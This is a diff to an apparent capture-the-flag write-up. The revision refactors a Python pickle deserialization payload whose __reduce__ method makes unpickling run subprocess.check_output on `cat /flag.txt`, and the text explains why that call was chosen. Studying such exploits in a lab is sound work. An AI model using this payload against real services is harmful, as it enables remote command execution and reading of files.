@@ -28,11 +28,14 @@ So, all we need to do is construct an object that when unpickled, will return th
 
 I tried to do this with the code below:
 ```python
-class PickleRce(object):
+from base64 import b64encode
+from pickle import dumps
+from functools import partial
+from subprocess import check_output
+
+class RCE(object):
     def __reduce__(self):
-        import subprocess
-        import functools
-        return (partial(subprocess.check_output, universal_newlines=True), (['cat', '/flag.txt'],))
+        return (partial(check_output, universal_newlines=True), (['cat', '/flag.txt'],))
 ```
 
 I decided to use subprocess and functools because using `os.popen` or `open` would require me to call a method of the returned object in order to get a string returned (in this case `.read()`). So, my method uses functools to create a function object that will call `subprocess.check_output` with the parameter `universal_newlines=True` in order to make the function return a string rather than bytes. 
